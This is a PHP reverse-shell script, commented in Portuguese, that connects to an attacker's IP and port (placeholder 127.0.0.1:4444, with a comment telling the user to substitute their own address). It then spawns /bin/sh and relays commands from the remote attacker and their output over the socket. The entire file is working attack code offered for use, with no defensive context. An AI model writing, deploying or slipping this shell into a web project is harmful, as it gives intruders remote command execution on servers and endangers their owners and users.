<?php
set_time_limit(0);  // Impede o script de expirar
$ip = '127.0.0.1';     // Substitua 'SEU_IP' pelo seu IP público ou o IP da máquina do atacante
$port = 4444;       // A porta que você está escutando no seu terminal

// Tenta abrir uma conexão de socket com o atacante
$sock = fsockopen($ip, $port);  
if (!$sock) {
    die('Falha na conexão com o atacante.');
}

// Configuração dos pipes para executar comandos do shell
$descriptorspec = array(
    0 => array("pipe", "r"),  // Entrada
    1 => array("pipe", "w"),  // Saída
    2 => array("pipe", "w")   // Erro
);

// Cria um processo de shell no servidor PHP
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
if (is_resource($process)) {
    while ($f = fgets($pipes[1])) { // Lê a saída do shell
        fwrite($sock, $f); // Envia a saída para o atacante
    }
    while ($f = fgets($sock)) { // Lê o comando enviado pelo atacante
        fwrite($pipes[0], $f); // Passa o comando para o shell
    }

    // Fecha os pipes e o socket após a execução
    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
}
?>
